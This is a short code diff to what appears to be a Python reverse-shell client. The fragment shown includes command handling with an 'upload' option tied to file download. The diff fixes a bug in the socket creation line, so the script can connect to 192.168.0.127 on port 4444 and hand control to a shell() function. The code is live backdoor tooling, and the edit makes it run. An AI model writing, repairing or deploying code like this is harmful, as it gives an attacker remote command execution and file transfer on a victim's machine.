@@ -39,6 +39,6 @@ def shell():
         elif comando_foda [:6] == 'upload':
             download_file(comando_foda[7:])
 
-sock = socket.socket(socket.AF_INET, sock.SOCK_STREAM)
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.connect(("192.168.0.127", 4444))
 shell ()
